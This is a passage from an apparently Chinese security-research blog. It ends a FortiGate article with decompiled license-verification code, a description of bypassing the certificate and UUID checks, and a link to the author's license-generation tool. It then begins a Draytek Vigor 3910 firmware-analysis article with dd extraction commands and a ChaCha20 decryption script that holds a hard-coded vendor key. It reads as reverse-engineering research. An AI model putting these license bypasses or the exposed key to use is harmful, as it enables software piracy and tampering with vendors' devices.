<span class="number">1</span> )</span><br><span class="line">                      lic_struct[<span class="number">162</span>] = <span class="number">1</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( b64_decoded_len_1_1 &lt;= <span class="number">0xF</span></span><br><span class="line">                  || (v13 = &amp;decoded_license[*decoded_license + <span class="number">4</span>],</span><br><span class="line">                      v46 = *decoded_license,</span><br><span class="line">                      v14 = *decoded_license,</span><br><span class="line">                      v13 &gt; &amp;decoded_license[b64_decoded_len_1_1])</span><br><span class="line">                  || (v15 = *v13, dest = v13 + <span class="number">4</span>, (v50 = decrypt_pubkey()) == <span class="number">0</span>) )<span class="comment">// è§£å¯†å…¬é’¥</span></span><br><span class="line">                &#123;</span><br><span class="line">LABEL_74:</span><br><span class="line">                  v31 = <span class="number">-1</span>;</span><br><span class="line">                  <span class="built_in">free</span>(decoded_license);</span><br><span class="line">                  <span class="keyword">return</span> v31;</span><br><span class="line">                &#125;</span><br><span class="line">                v16 = EVP_PKEY_get1_RSA(v50);   <span class="comment">// åŠ è½½å…¬é’¥</span></span><br><span class="line">                rsa_obj = v16;</span><br><span class="line">                <span class="keyword">if</span> ( !v16 )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_73;</span><br><span class="line">                v18 = RSA_size(v16);</span><br><span class="line">                decrypted_license = <span class="built_in">calloc</span>(v18, <span class="number">1uLL</span>);</span><br><span class="line">                <span class="keyword">if</span> ( !decrypted_license )</span><br><span class="line">                &#123;</span><br><span class="line">                  v31 = <span class="number">-1</span>;</span><br><span class="line">                  RSA_free(rsa_obj);</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_60;</span><br><span class="line">                &#125;</span><br><span class="line">                decrypted_license_1 = decrypted_license;</span><br><span class="line">                v20 = RSA_public_decrypt(v14, (decoded_license + <span class="number">4</span>), decrypted_license, rsa_obj, <span class="number">1LL</span>);</span><br><span class="line">                RSA_free(rsa_obj);</span><br><span class="line">                <span class="keyword">if</span> ( v20 &gt; <span class="number">31</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v58 = _mm_loadu_si128(decrypted_license_1);</span><br><span class="line">                  v59 = _mm_loadu_si128(decrypted_license_1 + <span class="number">1</span>);</span><br><span class="line">                  <span class="built_in">free</span>(decrypted_license_1);</span><br><span class="line">                  pub_dec_len = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">free</span>(decrypted_license_1);</span><br><span class="line">                  <span class="keyword">if</span> ( v46 != <span class="number">32</span> )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_73;</span><br><span class="line">                  pub_dec_len = <span class="number">1</span>;</span><br><span class="line">                  v58 = _mm_loadu_si128((decoded_license + <span class="number">4</span>));</span><br><span class="line">                  v59 = _mm_loadu_si128((decoded_license + <span class="number">20</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                v21 = sub_2DCE270(dest, v15, &amp;v58, &amp;v58);</span><br><span class="line">                <span class="keyword">if</span> ( *(v21 + <span class="number">1</span>) == <span class="number">0x13A38693</span> ) <span class="comment">// æ£€æŸ¥ magic</span></span><br><span class="line">                &#123;</span><br><span class="line">                  v22 = v21[v15 - <span class="number">1</span>];</span><br><span class="line">                  v23 = v21 + <span class="number">12</span>;</span><br><span class="line">                  <span class="keyword">if</span> ( v22 &lt; <span class="number">0x10</span>u )</span><br><span class="line">                    v15 -= v22;</span><br><span class="line">                  v24 = &amp;v21[v15];</span><br><span class="line">                  <span class="keyword">if</span> ( v23 &gt;= v24 )</span><br><span class="line">                  &#123;</span><br><span class="line">LABEL_45:</span><br><span class="line">                    v33 = *lic_struct;</span><br><span class="line">                    lic_struct[<span class="number">160</span>] = pub_dec_len;</span><br><span class="line">                    <span class="keyword">if</span> ( v33 )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v34 = *(lic_struct + <span class="number">1</span>);</span><br><span class="line">                      <span class="keyword">if</span> ( v34 )</span><br><span class="line">                      &#123;</span><br><span class="line">                        v35 = check_cert(v34, v33);    <span class="comment">// æ£€æŸ¥è¯ä¹¦</span></span><br><span class="line">                        <span class="keyword">if</span> ( v35 == <span class="number">1</span> )</span><br><span class="line">                          lic_struct[<span class="number">161</span>] = <span class="number">1</span>;</span><br><span class="line">                        v33 = *lic_struct;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">22</span>; ++i )</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v33, (&amp;vm_prefix_list)[<span class="number">2</span> * i], <span class="number">6uLL</span>) )</span><br><span class="line">                        &#123;</span><br><span class="line">                          v31 = <span class="number">0</span>;</span><br><span class="line">                          *(lic_struct + <span class="number">20</span>) = qword_4ED4B48[<span class="number">4</span> * i];</span><br><span class="line">                          <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                      v31 = <span class="number">-1</span>;</span><br><span class="line">LABEL_54:</span><br><span class="line">                      <span class="keyword">if</span> ( !pub_dec_len || (v37 = *(lic_struct + <span class="number">20</span>), v37 == <span class="number">0x17</span>) || v37 == <span class="number">2</span> )<span class="comment">// ä¸€å®šä¼šè¿›å…¥ï¼Œå› ä¸ºå…¬é’¥è§£å¯†å¾—åˆ°çš„å­—èŠ‚æ•°é‡ä¸º 32</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( *(lic_struct + <span class="number">6</span>) )<span class="comment">// uuid</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          gen_uuid(v57);</span><br><span class="line">                          input_uuid_to_bin(*(lic_struct + <span class="number">6</span>), v60);</span><br><span class="line">                          <span class="keyword">if</span> ( check_uuid(v57, v60) )<span class="comment">// æ£€æŸ¥ UUID</span></span><br><span class="line">                            *(lic_struct + <span class="number">20</span>) = <span class="number">1</span>;<span class="comment">// å¦‚æœèµ‹å€¼ä¸º 1 è¡¨ç¤ºéæ³•</span></span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        *(lic_struct + <span class="number">20</span>) = <span class="number">1</span>;</span><br><span class="line">                        v31 = <span class="number">-1</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_60;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_73;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v25 = *v23;</span><br><span class="line">                    v26 = v23 + <span class="number">1</span>;</span><br><span class="line">                    v27 = &amp;v23[v25 + <span class="number">1</span>];</span><br><span class="line">                    v28 = *(v27 + <span class="number">1</span>);</span><br><span class="line">                    v29 = (v27 + <span class="number">3</span>);</span><br><span class="line">                    v30 = *v27;</span><br><span class="line">                    v56 = <span class="number">0</span>;</span><br><span class="line">                    v23 = &amp;v27[v28 + <span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">if</span> ( v25 &lt; <span class="number">8</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span> ( (v25 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        *v60 = *v26;</span><br><span class="line">                        *(&amp;v59.m128i_i32[<span class="number">3</span>] + v25) = *(v26 + v25 - <span class="number">4</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">else</span> <span class="keyword">if</span> ( v25 )</span><br><span class="line">                      &#123;</span><br><span class="line">                        v60[<span class="number">0</span>] = *v26;</span><br><span class="line">                        <span class="keyword">if</span> ( (v25 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">                          *(&amp;v59.m128i_i16[<span class="number">7</span>] + v25) = *(v26 + v25 - <span class="number">2</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                      v60[v25] = <span class="number">0</span>;</span><br><span class="line">                      <span class="keyword">if</span> ( v30 == <span class="number">110</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">LABEL_40:</span><br><span class="line">                        <span class="keyword">if</span> ( v28 != <span class="number">4</span> )</span><br><span class="line">                          <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">                        v29 = &amp;v56;</span><br><span class="line">                        v56 = _byteswap_ulong(*(v27 + <span class="number">3</span>));</span><br><span class="line">LABEL_36:</span><br><span class="line">                        fillin_license_struct(lic_struct, v60, v30, v29, v28);</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      *(&amp;v59.m128i_i64[<span class="number">1</span>] + v25) = *(v26 + v25 - <span class="number">8</span>);</span><br><span class="line">                      qmemcpy(v60, v26, <span class="number">8</span> * ((v25 - <span class="number">1</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">                      v60[v25] = <span class="number">0</span>;</span><br><span class="line">                      <span class="keyword">if</span> ( v30 == <span class="number">110</span> )</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ( v30 == <span class="number">115</span> )</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">LABEL_37:</span><br><span class="line">                    <span class="keyword">if</span> ( v24 &lt;= v23 )</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">LABEL_73:</span><br><span class="line">                v31 = <span class="number">-1</span>;</span><br><span class="line">LABEL_60:</span><br><span class="line">                <span class="built_in">free</span>(decoded_license);</span><br><span class="line">                EVP_PKEY_free(v50);</span><br><span class="line">                <span class="keyword">return</span> v31;</span><br><span class="line">              &#125;</span><br><span class="line">              *license_end_1_1 = <span class="number">45</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯¹æ¯”æ—§ç‰ˆéªŒè¯é€»è¾‘ï¼Œæ€»ç»“å˜åŠ¨å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. å»é™¤äº†å•ç‹¬ä½¿ç”¨ AES ç®—æ³•è§£å¯† License çš„ä»£ç </span><br><span class="line">2. æ–°å¢å¯¹ License ä¸­è¯ä¹¦çš„æ£€æŸ¥ (å¯¹æ¯”è¯ä¹¦çš„ CN å’Œåºåˆ—å·æ˜¯å¦ç›¸åŒ)</span><br><span class="line">3. æ–°å¢å¯¹ UUID çš„æ£€æŸ¥ (åˆ¤æ–­æ˜¯å¦å’Œç¨‹åºè®¡ç®—å¾—åˆ°çš„ UUID ç›¸åŒ)</span><br><span class="line">4. License ä¸­æ–°å¢ CMS å†…å®¹ï¼Œå¦‚æœæ£€æµ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶åŒ…å« CMSï¼Œåˆ™å¯¹ CMS è¿›è¡Œæ£€æŸ¥</span><br></pre></td></tr></table></figure></div>

<p>å¯¹äºç¬¬ä¸€ç‚¹ï¼Œä»£ç åœ¨å¤„ç† License æ—¶ä¼šå…ˆè¯»å–å¼€å¤´ 4 ä¸ªå­—èŠ‚ï¼Œè¿™ 4 å­—èŠ‚è¡¨ç¤º Header é•¿åº¦ï¼Œé»˜è®¤ä¸º 64ã€‚ç„¶åè·å–åç»­ 64 å­—èŠ‚ï¼Œå†ç”¨å†…å­˜ä¸­è§£å‹å¾—åˆ°çš„å…¬é’¥è¿›è¡Œè§£å¯†ï¼Œå°†è§£å¯†ç»“æœä½œä¸º AES KEYï¼Œä½¿ç”¨ AES ç®—æ³•ç»§ç»­è§£å¯†å‰©ä½™å†…å®¹ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è·å–ä¸€ä¸ªåˆæ³•çš„ License Headerï¼Œå¹¶ä½¿ç”¨å®ƒå¯¹åº”çš„ AES KEY åŠ å¯† License æ•°æ®å³å¯é€šè¿‡éªŒè¯ã€‚</p>
<p>å¯¹äºç¬¬äºŒã€ä¸‰ç‚¹ï¼Œç”±äºåœ¨è·å– SHELL æƒé™æ—¶å°±éœ€è¦å¯¹ init ç¨‹åºè¿›è¡Œä¿®æ”¹ï¼Œæ‰€ä»¥é¡ºä¾¿æŠŠä¸¤ä¸ªåˆ¤æ–­ä¹Ÿç»•è¿‡ã€‚æ˜¯å¦åŒ…å« CMS å¯¹ License éªŒè¯åŸºæœ¬æ— å½±å“ï¼Œæ‰€ä»¥ CMS éªŒè¯æš‚æ—¶å¿½ç•¥ã€‚</p>
<p>æŒ‰ç…§ä¸Šé¢çš„æ€è·¯æˆ‘ç¼–å†™äº†é’ˆå¯¹æ–°ç‰ˆçš„ License ç”Ÿæˆå·¥å…·ï¼Œä½ å¯ä»¥åœ¨ <a class="link"   href="https://github.com/rrrrrrri/fgt-gadgets" >Github<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ä¸Šè·å–ã€‚</p>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p>æœ¬æ–‡ä»‹ç»äº†ä¸€ç§é€šè¿‡ä¿®æ”¹ FortiGate å†…æ ¸ä¸æ–‡ä»¶ç³»ç»Ÿå®ç°è·å– SHELL æƒé™çš„æ–¹æ³•ï¼Œä¿®æ”¹åæ— éœ€è°ƒè¯•å†…æ ¸æˆ–è€…å…³å¿ƒ rootfs.gz åŠ è§£å¯†å³å¯å¯åŠ¨ç³»ç»Ÿã€‚åˆ†æäº†æ–°ç‰ˆæ·»åŠ çš„å¯ä¿¡æ‰§è¡Œç­–ç•¥ï¼Œå¹¶æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥ç»•è¿‡ã€‚åˆ†æäº†æ–°ç‰ˆçš„ License æ ¡éªŒé€»è¾‘ï¼Œå¹¶æ›´æ–°å·¥å…·å®ç°å¯¹æ–°ç‰ˆæœ¬çš„ç ´è§£ã€‚</p>
<p>é™¤æ–‡ä¸­æåˆ°çš„ä»¥å¤–ï¼Œç³»ç»Ÿè¿˜å­˜åœ¨å…¶å®ƒæ ¡éªŒé€»è¾‘ï¼Œç»•è¿‡æ–¹æ³•å°±ç•™ç»™æ„Ÿå…´è¶£çš„è¯»è€…è‡ªè¡Œæ¢ç´¢äº†ã€‚</p>
<p><a class="link"   href="https://jamchamb.net/2022/01/02/modify-vmlinuz-arm.html" >https://jamchamb.net/2022/01/02/modify-vmlinuz-arm.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.optistream.io/blogs/tech/fortigate-firmware-analysis" >https://www.optistream.io/blogs/tech/fortigate-firmware-analysis<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://stackoverflow.com/questions/76571876/how-to-repack-vmlinux-elf-back-to-bzimage-file" >https://stackoverflow.com/questions/76571876/how-to-repack-vmlinux-elf-back-to-bzimage-file<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://reverseengineering.stackexchange.com/questions/27803/repacking-vmlinux-into-zimage-bzimage" >https://reverseengineering.stackexchange.com/questions/27803/repacking-vmlinux-into-zimage-bzimage<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/kiler129/recreate-zImage" >https://github.com/kiler129/recreate-zImage<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://elixir.bootlin.com/" >https://elixir.bootlin.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/438209486" >https://zhuanlan.zhihu.com/p/438209486<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://liwugang.github.io/2020/10/25/introduce_lsm.html" >https://liwugang.github.io/2020/10/25/introduce_lsm.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>Draytek Vigor 3910</title>
    <url>/2024/02/19/vigor_3910/</url>
    <content><![CDATA[<p>Vigor 3910 ç›¸å…³åˆ†æ</p>
<span id="more"></span>

<h2 id="Vigor-3910"><a href="#Vigor-3910" class="headerlink" title="Vigor 3910"></a>Vigor 3910</h2><p>Vigor 3910 æ˜¯å°æ¹¾ Draytek(å±…æ˜“ç§‘æŠ€)å…¬å¸æ¨å‡ºçš„ä¸€æ¬¾å››æ ¸å¿ƒç½‘å…³è®¾å¤‡ï¼Œæä¾› 10G SFP+ã€2.5G ä»¥å¤ªç½‘ç­‰æ¥å£ï¼Œå¹¶ä¸”æ”¯æŒ VPN å’Œé˜²ç«å¢™åŠŸèƒ½ï¼Œå› æ­¤åœ¨ä¼ä¸šåœºæ™¯æœ‰è¾ƒå¤šåº”ç”¨ã€‚</p>
<p>å·²ç»æœ‰å‰è¾ˆåœ¨ <a class="link"   href="https://www.hexacon.fr/slides/hexacon_draytek_2022_final.pdf" >2022 å¹´ hexacon<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> å‘å¸ƒäº†é’ˆå¯¹ Vigor 3910 çš„ç›¸å…³ç ”ç©¶ï¼Œæœ¬æ–‡åœ¨æ­¤ç ”ç©¶åŸºç¡€ä¸Šæ•´åˆç›¸å…³å·¥å…·å¹¶å¤ç° CVE-2023-31447 æ¼æ´ã€‚</p>
<h2 id="å›ºä»¶å¤„ç†"><a href="#å›ºä»¶å¤„ç†" class="headerlink" title="å›ºä»¶å¤„ç†"></a>å›ºä»¶å¤„ç†</h2><p>Draytek æä¾›å›ºä»¶<a class="link"   href="https://fw.draytek.com.tw/" >ä¸‹è½½åœ°å€<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œæˆ‘ä»¬ä¸‹è½½ 3.9.7.2 å’Œ 4.3.2.5 ä¸¤ä¸ªç‰ˆæœ¬ç”¨äºåç»­åˆ†æã€‚</p>
<p>ä½¿ç”¨ binwalk åˆ†æä¸¤ä¸ªæ–‡ä»¶çš„ç†µå€¼</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-1.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>Vigor 3910 v3.9.7.2</em></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-2.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>Vigor 3910 v4.3.2.5</em></td>
</tr>
</tbody></table>
<p>3.9 ç‰ˆæœ¬å¯ä»¥è§£æå‡ºå¾ˆå¤šç‰¹å¾ï¼Œè€Œ 4.3 ç‰ˆæœ¬ä¼¼ä¹é‡‡å–äº†æŸç§åŠ å¯†ï¼Œæ— æ³•ç›´æ¥è§£æã€‚è€ƒè™‘å›ºä»¶å‡çº§ç­–ç•¥ï¼Œåœ¨ 3.9 ç‰ˆæœ¬ä¸­å¯èƒ½é¢„ç½®äº† 4.3 ç‰ˆæœ¬çš„è§£å¯†å¯†é’¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆåˆ†æ 3.9 ç‰ˆæœ¬å›ºä»¶ã€‚</p>
<p>æ ¹æ®å‚è€ƒæ–‡ç« å¾—çŸ¥ï¼Œå›ºä»¶é€šè¿‡ THUNDER å…³é”®å­—åˆ†å‰²ä¸ºå¤šä¸ªéƒ¨åˆ†ï¼ŒåŒ…æ‹¬ä¸¤ä¸ª boot.binï¼Œinit.bin å’Œ ATF stage 1ï¼Œå…ˆæŒ‰ç…§ç‰¹å¾å°†å›ºä»¶æ‹†å¼€</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dd if=v3910_3972.all of=boot1.bin skip=8198 count=12288 bs=16</span><br><span class="line">dd if=v3910_3972.all of=boot2.bin skip=20486 count=79552 bs=16</span><br><span class="line">dd if=v3910_3972.all of=init.bin skip=100038 count=162112 bs=16</span><br><span class="line">dd if=v3910_3972.all of=stage1.bin skip=262150 bs=16</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ ATF stage 1 ä¸­å¯ä»¥æ‰¾åˆ° <code>BL1: Booting BL2</code> ç­‰å­—ç¬¦ä¸²ï¼Œæ­¤ä¸º <a class="link"   href="https://chromium.googlesource.com/external/github.com/ARM-software/arm-trusted-firmware/+/v0.4-rc1/docs/firmware-design.md" >ARM Trusted Firmware<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ç›¸å…³å†…å®¹ï¼Œæ‰€ä»¥ 3910 è®¾å¤‡ä¸Šå¯èƒ½ä½¿ç”¨äº† ATF æŠ€æœ¯ã€‚å‚è€ƒ ATF å¯åŠ¨æµç¨‹ï¼ŒCPU ä¼šå…ˆæ‰§è¡Œ BL1ï¼ŒBL1 é€šå¸¸è¢«çƒ§å½•åœ¨ ROM ä¸­ï¼ŒBL1 å®Œæˆåˆå§‹åŒ–å·¥ä½œä¹‹åä¼šé€šè¿‡ UUID æŸ¥æ‰¾å…¶ä»– BL çš„ä½ç½®ï¼ŒBL2ã€BL3ã€ç³»ç»Ÿé•œåƒç­‰éƒ¨åˆ†è¢«å•ç‹¬æ‰“åŒ…åœ¨ fip.binï¼Œå­˜æ”¾åˆ° flash å†…ã€‚è€ƒè™‘åˆ°å…³é”®éƒ¨åˆ†åº”è¯¥åœ¨ fip.binï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•æ‰¾åˆ°æ­¤æ–‡ä»¶å¹¶è§£åŒ…ã€‚</p>
<p>æŸ¥çœ‹ ARM ATF å¼€æºä»£ç å‘ç° fip.bin æ˜¯ä»¥ TOC_HEADER_NAME å’Œ TOC_HEADER_SERIAL_NUMBER å¼€å¤´</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* This is used as a signature to validate the blob header */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOC_HEADER_NAME	0xAA640001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOC_HEADER_SERIAL_NUMBER 0x12345678</span></span><br><span class="line"></span><br><span class="line">toc_header = (<span class="type">fip_toc_header_t</span> *)buf;</span><br><span class="line">toc_header-&gt;name = TOC_HEADER_NAME;</span><br><span class="line">toc_header-&gt;serial_number = TOC_HEADER_SERIAL_NUMBER;</span><br><span class="line">toc_header-&gt;flags = toc_flags;</span><br></pre></td></tr></table></figure></div>

<p>ä» stage1.bin ä¸­æŸ¥æ‰¾è¿™ä¸¤ä¸ªå®šä¹‰</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-3.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>fip.bin</em></td>
</tr>
</tbody></table>
<p>äºæ˜¯æ‰¾åˆ°äº† fip.bin çš„èµ·å§‹ä½ç½®ï¼Œä»è¿™é‡Œå¼€å§‹å°†æ–‡ä»¶åˆ†å‰²ï¼Œå¾—åˆ° fip.bin (å°†å‰ 8 å­—èŠ‚åˆ é™¤)</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=stage1.bin of=fip.bin skip=16383 bs=16</span><br></pre></td></tr></table></figure></div>

<p>æ¥ç€ä¸‹è½½å¹¶ç¼–è¯‘ fiptool</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ARM-software/arm-trusted-firmware</span><br><span class="line"><span class="built_in">cd</span> arm-trusted-firmware</span><br><span class="line">make fiptool</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå¯¹ fip.bin è¿›è¡Œæ‹†åˆ†</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">fiptool unpack ./fip.bin</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ° nt-fw.binã€soc-fw.binã€tb-fw.bin ç­‰æ–‡ä»¶ï¼Œnt-fw.bin å³ BL33ã€‚</p>
<p>é€†å‘åˆ†ææ­¤æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å« <code>Decrypt file</code>ï¼Œ<code>expand 32-byte k</code> ç­‰å­—ç¬¦ä¸²ï¼Œè€Œ <code>expand 32-byte k</code> æ°å¥½æ˜¯ salsa20 æˆ–è€… chacha20 ç®—æ³•çš„æ ‡å¿—(æ ¹æ®å‚è€ƒæ–‡ç« å¯çŸ¥å…¶å®æ˜¯ ChaCha20 ç®—æ³•)ï¼Œå¹¶ä¸”åœ¨ç¨‹åºä¸­èƒ½å¤Ÿæ‰¾åˆ°å¯†é’¥</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-4.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>ChaCha20 å¯†é’¥</em></td>
</tr>
</tbody></table>
<p>è¿›ä¸€æ­¥åˆ†æè§£å¯†å‡½æ•°ï¼Œå®ƒè¿˜ä¼šä»åŠ å¯†çš„æ–‡ä»¶å¤´éƒ¨è·å– nonce å€¼ï¼Œç”±äºå›ºä»¶ä¸æ˜¯æ•´ä¸ªéƒ½ä½¿ç”¨ ChaCha20 ç®—æ³•è¿›è¡ŒåŠ å¯†ï¼Œæ‰€ä»¥è¿˜è¦åˆ†æå…¶æ ¼å¼ï¼Œæ‰¾åˆ°åŠ å¯†çš„é•œåƒä»¥åŠ nonce å‚æ•°ã€‚</p>
<p>è§‚å¯Ÿå›ºä»¶å¼€å¤´æ•°æ®</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-5.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>v4.3.2.5 æ–‡ä»¶å¼€å¤´</em></td>
</tr>
</tbody></table>
<p>å…¶ä¸­åŒ…å« env_Imageã€nonce ç­‰å­—ç¬¦ä¸²ï¼Œå‚è€ƒ BL33 ä¸­çš„è§£å¯†é€»è¾‘æ¨æµ‹ï¼Œæ­¤å¤„æ•°æ®ç»“æ„ä¸º</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> data_length;</span><br><span class="line"><span class="type">char</span> data[data_length];</span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥ nonce å¯ä»¥æå–å‡ºæ¥ï¼š <code>UODAjyXZOzH0</code>ï¼ŒåŠ å¯†çš„é•œåƒé•¿åº¦ä¹Ÿå·²çŸ¥ï¼š <code>0x034A1A00</code></p>
<p>å°† enc_Image éƒ¨åˆ†æ‹†å‡ºï¼Œç¼–å†™è§£å¯†ä»£ç è¿›è¡Œè§£å¯†(å»æ‰å‰ 3 ä¸ªå­—èŠ‚)</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=v3910_4325.all of=enc_Image skip=15 count=3449248 bs=16</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_decrypt</span>(<span class="params">enc_Image</span>):</span><br><span class="line">    nonce = <span class="string">b&quot;UODAjyXZOzH0&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(enc_Image, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        enc_data = f.read()</span><br><span class="line">    </span><br><span class="line">    key = <span class="string">b&quot;0DraytekKd5Eason3DraytekKd5Eason&quot;</span>    <span class="comment"># J to E</span></span><br><span class="line">    cipher = ChaCha20.new(key=key, nonce=nonce)</span><br><span class="line">    dec_data = cipher.decrypt(enc_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(enc_Image + <span class="string">&quot;_decrypted.bin&quot;</span>, <span 